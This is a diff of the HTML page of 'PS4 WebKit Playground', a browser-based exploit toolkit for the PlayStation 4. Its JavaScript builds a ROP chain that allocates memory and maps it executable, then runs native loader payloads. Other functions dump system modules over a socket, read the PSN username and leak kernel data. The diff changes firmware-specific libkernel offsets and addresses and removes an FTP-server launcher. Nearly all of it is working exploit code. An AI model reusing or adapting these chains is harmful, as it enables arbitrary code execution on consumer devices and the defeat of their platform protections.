@@ -1,17 +1,16 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 	<head>
 		<title>PS4-playground</title>
 		
 		<link rel="stylesheet" type="text/css" href="css/main.css">
 		
-
 		<script type="text/javascript" src="js/utils.js"></script>
-		<script type="text/javascript" src="js/long.js"></script>
 		<script type="text/javascript" src="js/exploit.js"></script>
 		<script type="text/javascript" src="js/network.js"></script>
 		<script type="text/javascript" src="js/just-rop.js"></script>
 		<script type="text/javascript" src="js/gadgets.js"></script>
+		<script type="text/javascript" src="js/code.js"></script>
 		<script type="text/javascript">
 function load() {
 	document.getElementById("environment").innerHTML = getEnvironmentInfo();
@@ -45,18 +44,16 @@ function load() {
 		document.getElementById("codeExecutionStage").innerHTML = "Stage: Done!";
 		setTimeout(function() { document.cookie = "codeExecutionStage=0"; location.reload(); }, 10);
 	}
-	
 }
-
 var SECTIONSIZE = 1024 * 1024;
-
 function cleanSessionVars() {
 	sessionStorage.executableHandle = null;
 	sessionStorage.writableHandle = null;
 }
 
 function allocateSharedMemory() {
-	chain.call("createSharedMemory", LIBKERNEL, 0x15170, 0, SECTIONSIZE, 1 | 2 | 4, chain.data);
+	logAdd("allocated");
+	chain.call("createSharedMemory", LIBKERNEL, 0x19660, 0, SECTIONSIZE, 1 | 2 | 4, chain.data);
 	chain.execute(function() {
 		var executableHandle = getU64from(chain.data);
 		logAdd("0x" + executableHandle.toString(16)); // 0x52
@@ -70,8 +67,8 @@ function allocateSharedMemory() {
 function allocateSharedMemory2() {
 	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");
 
-	chain.call("createSharedMemoryAlias", LIBKERNEL, 0x151c0, executableHandle, 1 | 2, chain.data);
-	chain.syscall("mmap", 477, 0x926300000, SECTIONSIZE * 2, 1 | 2, 4096, -1, 0);
+	chain.call("createSharedMemoryAlias", LIBKERNEL, 0x196B0, executableHandle, 1 | 2, chain.data);
+	chain.syscall("mmap", 477, 0x914800000, SECTIONSIZE * 2, 1 | 2, 4096, -1, 0);
 	chain.write_rax_ToVariable(0);
 	
 	chain.execute(function() {
@@ -92,8 +89,8 @@ function mapSharedMemory() {
 	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");
 	var writableHandle = JSON.parse(sessionStorage.writableHandle || "{}");
 
-	chain.call("mapSharedMemory", LIBKERNEL, 0x15210, writableHandle, 1 | 2, chain.data);
-	chain.syscall("mmap", 477, 0x926100000 + SECTIONSIZE, SECTIONSIZE, 1 | 4, 1, executableHandle, 0);
+	chain.call("mapSharedMemory", LIBKERNEL, 0x19700, writableHandle, 1 | 2, chain.data);
+	chain.syscall("mmap", 477, 0x914800000 + SECTIONSIZE, SECTIONSIZE, 1 | 4, 1, executableHandle, 0); //0x914800000
 	chain.write_rax_ToVariable(0);
 	
 	chain.execute(function() {
@@ -108,28 +105,24 @@ function mapSharedMemory() {
 }
 
 function payload() {
-	var writeAddress = 0x926100000;
-	var executeAddress = 0x926200000;
+	var writeAddress = 0x91a100000;
+	var executeAddress = 0x91a200000;
 	
 	// infinite loop
 	//setU32to(writeAddress, 0xfeeb);
 	
 	// return
-	//setU32to(writeAddress, 0xc3);
+	setU32to(writeAddress, 0xc3);
 	
 	// mini loop
 	//setU32to(writeAddress + 0 * 4, 0x48c03148);
 	//setU32to(writeAddress + 1 * 4, 0x4801e883);
 	//setU32to(writeAddress + 2 * 4, 0xf775c085);
 	//setU32to(writeAddress + 3 * 4, 0x000000c3);
-
-	if(sessionStorage.loadlinux == 1)
-		writeLinux(writeAddress) // Linux-loader
-	else
-	if(sessionStorage.loadftp == 1)
-		writeFtp(writeAddress) // Ftp-loader
-	else	
-	writeLoader(writeAddress); // WiFi-Loader
+	//if(sessionStorage.loadlinux == 1)
+	//	writeLinux(writeAddress) // Linux-loader
+	//else
+		writeLoader(writeAddress); // WiFi-Loader
 	
 	chain.start(executeAddress);
 	chain.write_rax_ToVariable(0);
@@ -140,12 +133,10 @@ function payload() {
 		logAdd("<h1>Refresh page and run Stage 4</h1>");
 	});
 }
-
-
 function copy() {
-	var writeAddress = 0x926100000;
-	var executeAddress = 0x926200000;
-	var dataAddress = 0x926300000;
+	var writeAddress = 0x91a100000;
+	var executeAddress = 0x91a200000;
+	var dataAddress = 0x91a300000;
 	
 	// Copy code
 	var c = [];
@@ -220,7 +211,6 @@ function copy() {
 		logAdd(hexDump(dataAddress, 256));
 	});
 }
-
 function getpid() {
 	chain.syscall("getpid", 20);
 	chain.write_rax_ToVariable(0);
@@ -229,7 +219,6 @@ function getpid() {
 		chain.logVariable(0);
 	});
 }
-
 function getlogin() {
 	chain.syscall("getlogin", 49, chain.data, 17);
 	
@@ -241,7 +230,6 @@ function getlogin() {
 		logAdd("Leaked pointer: 0x" + pointer.toString(16));
 	});
 }
-
 function setLDT() {
 	setU32to(chain.data + 0, 0xffffffff);
 	setU64to(chain.data + 4, chain.data + 64);
@@ -271,16 +259,14 @@ function setLDT() {
 		chain.logVariable(0);
 	});
 }
-
 function getThread() {
-	chain.call("getThread", LIBKERNEL, 0x128F0);
+	chain.call("getThread", LIBKERNEL, 0x7a00);
 	chain.write_rax_ToVariable(0);
 	
 	chain.execute(function() {
 		chain.logVariable(0);
 	});
 }
-
 function getLoadedModules() {
 	var countAddress = chain.data;
 	var modulesAddress = chain.data + 8;
@@ -303,7 +289,6 @@ function getLoadedModules() {
 		}
 	});
 }
-
 function readModule() {
 	var moduleNumberV = document.getElementById("loadedModuleID").value;
 	
@@ -334,7 +319,6 @@ function readModule() {
 		logAdd("Size: " + (moduleSize / 1024).toString() + "KB");
 	});
 }
-
 function dumpModule() {
 	var hostAddr = document.getElementById("hostAddr").value;
 	var hostPort = document.getElementById("hostPort").value;
@@ -374,7 +358,6 @@ function dumpModule() {
 		logAdd("Dump sent to " + hostAddr + ":" + hostPort);
 	});
 }
-
 function loadModule() {
 	var moduleNumberV = document.getElementById("moduleID").value;
 	
@@ -407,7 +390,6 @@ function loadModule() {
 		logAdd("You can only load a single extra module, if you wish to load a different module restart the browser process.");
 	});
 }
-
 function loadNamedModule() {
 	var moduleName = document.getElementById("moduleName").value;
 	
@@ -427,7 +409,6 @@ function loadNamedModule() {
 		logAdd("Refresh the page and use Read Loaded Module");
 	});
 }
-
 function getPSN() {
 	var path = chain.data;
 	var contents = chain.data;
@@ -446,7 +427,6 @@ function getPSN() {
 		logAdd("PSN username: " + name);
 	});
 }
-
 function getSandboxDirectory() {
 	setU64to(chain.data, 10);
 	chain.syscall("getSandboxDirectory", 602, 0, chain.data + 8, chain.data);
@@ -457,7 +437,6 @@ function getSandboxDirectory() {
 		logAdd(name);
 	});
 }
-
 function getStackProtection() {
 	var info = chain.data;
 	
@@ -473,12 +452,11 @@ function getStackProtection() {
 		logAdd("Stack protection: 0x" + protection.toString(16));
 	});
 }
-
 function getStackName() {
 	var info = chain.data;
 	
 	//chain.syscall("getOtherMemoryInfo", 572, stack_base, 0, info, 0x40);
-	chain.syscall("getOtherMemoryInfo", 572, 0, 1, info, 0x40);
+	chain.syscall("getOtherMemoryInfo", 546, 0, 1, info, 0x40);
 	
 	chain.execute(function() {
 		var base = getU64from(info + 0x0);
@@ -497,7 +475,6 @@ function getStackName() {
 		logAdd("Stack name: " + name);
 	});
 }
-
 function socketSend() {
 	var hostAddr = document.getElementById("hostAddr").value;
 	var hostPort = document.getElementById("hostPort").value;
@@ -527,20 +504,10 @@ function socketSend() {
 		logAdd("\"" + socketMessage + "\" sent to " + hostAddr + ":" + hostPort);
 	});
 }
-
 function launchLinux() {
 	cleanSessionVars();
 	sessionStorage.loadlinux = 1;
 	allocateSharedMemory();
-
-	setTimeout(function() { document.cookie = "codeExecutionStage=1.1"; location.reload(); }, 10);
-}
-
-function launchFtp() {
-	cleanSessionVars();
-	sessionStorage.loadftp = 1;
-	allocateSharedMemory();
-
 	setTimeout(function() { document.cookie = "codeExecutionStage=1.1"; location.reload(); }, 10);
 }
 		</script>
@@ -548,7 +515,7 @@ function launchFtp() {
 	
 	<body onload="load()">
 		<div class="header">
-			<h1>PS4 WebKit Playground - 1.01 version - Wildcard</h1>
+			<h1>PS4 WebKit Playground</h1>
 			<h2>CTurt, kR105, flatz, SKFU, droogie, Xerpi, Hunger, Takezo, nas, Proxima</h2>
 			
 			<div id="environment"></div>
@@ -561,12 +528,27 @@ function launchFtp() {
 				<h2>Server</h2>
 				<div>
 					IP:
-					<input type="text" value="192.168.1.99" id="hostAddr" /><br>
+					<input type="text" value="192.168.1.65" id="hostAddr" /><br>
 					<br>
 					
 					Port:
 					<input type="number" value="9023" id="hostPort" /><br>
 					<br>
+				</div>
+			</div>
+			
+			<div class="box">
+				<h2>Linux loader</h2>
+
+				<div>
+					Make sure to have files <b>initramfs.cpio.gz</b> and <b>bzImage</b> <br>
+					on a USB drive connected to the PS4 before loading this
+				</div>
+
+				<br>
+
+				<div>
+					<button onclick="launchLinux()">Load!</button>
 				</div>
 			</div>
 			
@@ -678,7 +660,7 @@ function launchFtp() {
 				<br>
 				
 				<div>
-					Module ID (<a href="http://www.ps3devwiki.com/ps4/Libraries#Libraries_on_firmware_1.76">check this list</a>):
+					Module ID (<a href="http://www.psdevwiki.com/ps4/Libraries#Libraries_on_firmware_1.76">check this list</a>):
 					<input type="number" id="moduleID" />
 					<button onclick="loadModule()">Load Module</button>
 				</div>
@@ -686,24 +668,16 @@ function launchFtp() {
 				<br>
 				
 				<div>
-					Module name (<a href="http://www.ps3devwiki.com/ps4/Libraries#Libraries_on_firmware_1.76">check this list</a>):
+					Module name (<a href="http://www.psdevwiki.com/ps4/Libraries#Libraries_on_firmware_1.76">check this list</a>):
 					<input type="text" id="moduleName" value="libSceGnmDriver.sprx" />
 					<button onclick="loadNamedModule()">Load Module</button>
 				</div>
 			</div>
-
+			
 			<div class="box">
-				<h2>Linux loader</h2>
-
+				<h2>Misc</h2>
 				<div>
-					Make sure to have files <b>initramfs.cpio.gz</b> and <b>bzImage</b> <br/>
-					on a USB drive connected to the PS4 before loading this.	
-				</div>
-
-				<br>
-
-				<div>
-					<button onclick="launchLinux()">Load!</button>
+					<button onclick="location.reload()">Refresh</button>
 				</div>
 			</div>
 			
@@ -722,29 +696,6 @@ function launchFtp() {
 			<div>
 				<button onclick="window.location.assign('elf-loader/index.html')">Load!</button>
 			</div>
-			</div>
-			
-			<div class="box">
-				<h2><FONT color="red">FTP Server + Debug settings</FONT></h2>
-					FTP Server + Enable Debug Settings<br>
-					<br>
-				Once Launched you will be able to connect on your PS4
-				using Port 1337 (User/Password are not checked)
-				<div>
-					<button onclick="launchFtp()">Launch FTP!</button>
-				</div>
-			</div>
-			
-			
-			<div class="box">
-				<h2>Misc</h2>
-				<div>
-					<button onclick="location.reload()">Refresh</button>
-				</div>
-			</div>
-			
-			<div class="box">
-				<a href="http://www.google.com">google</a>
 			</div>
 		</div>
 		
